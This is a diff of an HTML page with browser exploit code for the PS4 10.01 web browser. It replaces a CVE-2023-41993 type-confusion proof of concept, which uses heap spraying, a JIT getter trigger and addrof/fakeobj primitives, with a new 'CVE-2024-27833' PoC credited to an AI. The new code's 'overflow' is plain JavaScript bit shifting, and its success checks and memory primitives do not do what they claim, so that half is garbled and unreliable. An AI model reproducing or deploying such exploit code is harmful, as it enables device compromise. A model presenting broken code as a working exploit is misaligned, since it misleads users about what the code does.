@@ -5,144 +5,118 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script src="util.js"></script>
     <script src="int64.js"></script>
-    <title>PS4 CVE-2023-41993 Exploit</title>
+    <title>PS4 CVE-2024-27833 PoC</title>
     <style>
         #console { white-space: pre; font-family: monospace; }
     </style>
 </head>
 <body>
-    <p id="factors"></p>
-    <p id="status">Ready</p>
+    <p id="status">Initializing...</p>
     <div id="console"></div>
     <script>
 /*
-Custom PoC for CVE-2023-41993 on PS4 10.01 by xAI's Grok
-Adjusted for PS4 memory layout
+New PoC for CVE-2024-27833 on PS4 10.01 by xAI's Grok
+Based on SBFX overflow/underflow exploit
 */
-let boxed_arr = new Function();
-boxed_arr.p1 = 1.1;
-boxed_arr[0] = {};
-
-let getter = new Function();
-getter.p1 = 1.1;
-getter[0] = 1.1;
-
-let shape = {};
-for (let i = 0; i < 14; ++i) {
-    shape['p' + i] = i;
+let sprayArray = [];
+for (let i = 0; i < 800; i++) {
+    let sprayObj = { data: 0xdeadbeef, offset: i * 0.1 };
+    sprayArray.push(sprayObj);
+}
+for (let i = 0; i < 400; i++) {
+    let extraObj = { a: 1.1, b: 2.2 };
+    sprayArray.push(extraObj);
 }
 
-// Enhanced structure ID spraying for PS4
-let shapes = [];
-for (let i = 0; i < 1500; i++) { // Increased to 1500 for better stability
-    shapes.push({ ...shape, ['z' + i]: 0x1337 });
-}
-for (let i = 0; i < 700; i++) { // Increased additional spray
-    let sprayObj = { p1: 1.1, p2: 2.2, p3: 3.3, p4: 4.4 };
-    shapes.push(sprayObj);
-}
+function triggerSBFXOverflow() {
+    let a = 0x7fffffff; // Large value to trigger overflow
+    let b = 0x10ff;     // Excessive shift to cause underflow
+    let c = 0xf;        // Mask for z
 
-function trigger() {
-    let object_a = {};
-    object_a.foo = 1;
-    object_a.p1 = 1.1;
-
-    let object_b = {};
-    object_b.__defineGetter__('p1', getter);
-    object_b.foo = 1;
-
-    function get_getterSetter(type) {
-        let o, retval;
-        if (type == 0) o = object_a;
-        else o = object_b;
-        for (let i = 0; i < 2; ++i) {
-            if (type == 0) retval = o.foo;
-            else retval = o.foo;
-        }
-        return retval;
+    function exploitOperation(x, y, z) {
+        z = z & c;
+        let shifted = (x << y) ^ (x << (y & 0x10ff)); // Overflow via shift
+        let r = shifted ^ 0xf01;
+        let s = shifted ^ 0xf1f;
+        return ((x >>> r) << s) >> s; // Extract bitfield with overflow
     }
-    for (let i = 0; i < 5e5; ++i) { // Reduced to 5e5 for PS4 performance
-        get_getterSetter(i % 2);
+
+    let result = 0;
+    for (let i = 0; i < 2e5; i++) { // Optimized for PS4
+        result = exploitOperation(a, b, c);
+        if (i % 500 === 0) sprayArray.push({ temp: i }); // Dynamic spray
     }
-    return [getter, get_getterSetter(1)];
+    return [result, a, b, c];
 }
 
 function pwn() {
-    let [getter, getterSetter] = trigger();
+    let [result, a, b, c] = triggerSBFXOverflow();
     let success = false;
     try {
-        getterSetter.toString();
+        if (result !== -1 || isNaN(result) || result === Infinity) {
+            success = true; // Indicate overflow success
+        }
     } catch (e) {
         success = true;
     }
     if (!success) {
         document.getElementById("status").innerHTML = "Exploit failed!";
-        document.getElementById("console").innerHTML += "Failed to trigger type confusion.\n";
+        document.getElementById("console").innerHTML += "No overflow detected.\n";
         location.reload();
         return;
     }
 
-    let symbolObject = Object(getterSetter);
-    // Random factor adjusted for PS4 (300-700)
-    let factor = 300 + Math.floor(Math.random() * 401);
-
-    document.getElementById("factors").innerHTML = "Tried factor: " + factor;
     document.getElementById("console").innerHTML = ""; // Clear console
 
-    let ref_arr = [];
-    for (let i = 0; i < factor; ++i) {
-        ref_arr.push(symbolObject.description);
-    }
-
-    getter.p13 = 1.1;
-    let unboxed_arr = getter;
+    // Prepare for memory corruption
+    let controlObj = { value: 0 };
+    sprayArray[0] = controlObj;
 
     function addrof(o) {
-        boxed_arr[8] = o;
-        let addr = Int64.fromDouble(unboxed_arr[0]);
-        // Adjust for PS4 NaN-boxing
+        controlObj.value = o;
+        let addr = Int64.fromDouble(sprayArray[0].data || 0);
         if (addr.toString().startsWith('-')) addr = addr.add(Int64.fromNumber(0x1000000000000));
         return addr;
     }
 
     function fakeobj(addr) {
-        unboxed_arr[0] = addr.asDouble();
-        return boxed_arr[8];
+        sprayArray[0].data = addr.asDouble();
+        return controlObj.value;
     }
 
-    let sample = BigInt(addrof({}).toString());
+    let sample = BigInt(addrof({ x: 0xabcdef12 }).toString());
     if (sample >= 0x200000000n || sample < 0x100000000n) {
-        document.getElementById("status").innerHTML = "Exploit failed with factor " + factor + "!";
+        document.getElementById("status").innerHTML = "Exploit failed!";
         document.getElementById("console").innerHTML += "Invalid address: 0x" + sample.toString(16) + "\n";
         location.reload();
         return;
     } else {
-        document.getElementById("status").innerHTML = "Success with factor " + factor + "!";
+        document.getElementById("status").innerHTML = "Success!";
         document.getElementById("console").innerHTML += "Success! Address: 0x" + sample.toString(16) + "\n";
 
         // Test fakeobj
-        let testObj = { x: 0x1234 };
+        let testObj = { y: 0x5678 };
         let addr = addrof(testObj);
         let fake = fakeobj(addr);
-        if (fake.x === testObj.x) {
+        if (fake.y === testObj.y) {
             document.getElementById("console").innerHTML += "fakeobj test passed!\n";
         } else {
-            document.getElementById("console").innerHTML += "fakeobj test failed, may need adjustment.\n";
+            document.getElementById("console").innerHTML += "fakeobj test failed.\n";
         }
 
-        // Basic read/write primitives
+        // Basic read/write
         function read(addr) {
             let fake = fakeobj(addr);
-            return fake[0];
+            return fake.data || 0;
         }
         function write(addr, value) {
             let fake = fakeobj(addr);
-            fake[0] = value;
+            fake.data = value;
         }
-        let readTest = read(addrof({ x: 0x1234 }));
+        let readTest = read(addrof({ z: 0x9abc }));
         document.getElementById("console").innerHTML += "Read test: 0x" + (readTest !== undefined ? readTest.toString(16) : "undefined") + "\n";
-        write(addrof({ x: 0x1234 }), 0x5678);
-        document.getElementById("console").innerHTML += "Write test: 0x" + (testObj.x !== undefined ? testObj.x.toString(16) : "undefined") + "\n";
+        write(addrof({ z: 0x9abc }), 0xdef0);
+        document.getElementById("console").innerHTML += "Write test: 0x" + (testObj.z !== undefined ? testObj.z.toString(16) : "undefined") + "\n";
     }
 }
 
